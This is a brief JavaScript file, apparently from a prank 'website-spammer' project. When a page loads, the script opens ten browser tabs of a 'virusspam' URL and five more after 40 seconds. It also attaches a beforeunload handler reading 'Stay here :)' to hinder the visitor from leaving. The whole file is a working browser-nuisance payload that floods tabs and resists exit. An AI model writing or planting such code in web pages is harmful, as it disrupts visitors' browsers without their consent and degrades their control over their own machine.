function openMultipleTabs(url, times) {
  if (!url || isNaN(times) || times <= 0) {
    console.error("Invalid input: Provide a valid URL and a positive number of times.");
    return;
  }

  for (let i = 0; i < times; i++) {
    window.open(url);
  }
}

function setupBeforeUnloadWarning(message = "Stay here :)") {
  window.addEventListener("beforeunload", (e) => {
    e.returnValue = message; // For compatibility with older browsers
    return message; // Modern browsers use this
  });
}

// Open initial tabs and schedule more tabs after a delay
window.onload = () => {
  const initialUrl = "https://raadsl.github.io/website-spammer/virusspam/";
  const initialTimes = 10; // Number of times to open initially

  const delayedTimes = 5; // Number of tabs to open after delay
  const delayInMilliseconds = 40000; // 40 seconds

  // Open the initial set of tabs
  openMultipleTabs(initialUrl, initialTimes);

  // Schedule another set of tabs to open after the delay
  setTimeout(() => {
    openMultipleTabs(initialUrl, delayedTimes);
  }, delayInMilliseconds);

  // Setup before-unload warning
  setupBeforeUnloadWarning();
};
